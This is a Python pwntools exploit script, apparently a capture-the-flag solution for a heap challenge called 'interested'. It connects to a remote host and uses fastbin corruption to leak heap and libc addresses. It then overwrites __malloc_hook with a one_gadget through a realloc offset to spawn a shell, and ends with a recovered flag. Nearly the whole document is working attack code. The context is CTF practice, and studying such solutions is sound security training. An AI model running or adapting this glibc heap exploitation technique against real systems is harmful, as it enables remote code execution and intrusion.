#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./interested')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('123.56.85.29', 3041)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./interested', checksec=False)


def add(add_name_length, add_name, add_desc_length, add_desc):
    p.sendlineafter('> Now please tell me what you want to do :', '1')
    p.sendlineafter("> O's length : ", str(add_name_length))
    p.sendafter('> O : ', add_name)
    p.sendlineafter("> RE's length : ", str(add_desc_length))
    p.sendafter('> RE : ', add_desc)


def edit(edit_idx, edit_name, edit_desc):
    p.sendlineafter('> Now please tell me what you want to do :', '2')
    p.sendlineafter('> SCP project ID : ', str(edit_idx))
    p.sendlineafter('> SCP name : ', edit_name)
    p.sendlineafter('> SCP description : ', edit_desc)


def delete(delete_idx):
    p.sendlineafter('> Now please tell me what you want to do :', '3')
    p.sendlineafter('> Oreo ID : ', str(delete_idx))


def view(view_idx):
    p.sendlineafter('> Now please tell me what you want to do :', '4')
    p.sendlineafter('> Oreo ID : ', str(view_idx))
    p.recvuntil("# oreo's O is ")
    return p.recvuntil("\n# oreo's RE is ")[:-16]


libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p.sendafter('> Input your code please:', 'OreOOrereOOreO')
add(0x60, 's' * 0x50 + p64(0) + p64(0x61), 0x20, 'a')
add(0x50, 'a', 0x60, 'a')
add(0x50, 'a', 0x18, 'a')
delete(2)
delete(3)
add(0x60, 'a', 0x60, 'a')

addr_heap = u64(view(3).ljust(8, '\x00')) - 0xa0
delete(2)

add(0x50, p64(addr_heap + 0x60), 0x50, 'a')
add(0x50, 'sss', 0x50, p64(0) + p64(0x91))
delete(1)
view(1)

addr___malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x68
libcbase = addr___malloc_hook - libc.sym['__malloc_hook']
addr_one_gadget = libcbase + libc_one_gadget[3]
addr___libc_realloc = libcbase + libc.sym['__libc_realloc']

delete(2)
add(0x60, p64(addr___malloc_hook - 0x23), 0x60, 'a')
pd = '\x00' * 0xb
pd += p64(addr___libc_realloc + 16)
pd += p64(addr_one_gadget)
add(0x60, 'a', 0x60, pd)
# gdb.attach(p, "b *$rebase(0xF63)\nc")
p.sendlineafter('> Now please tell me what you want to do :', '1')
p.sendlineafter("> O's length : ", '100')
success('addr_heap          = ' + hex(addr_heap))
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
success('addr_one_gadget    = ' + hex(addr_one_gadget))
p.interactive()
# flag{4fc7ab2de3770bc3630c623c222df94e}
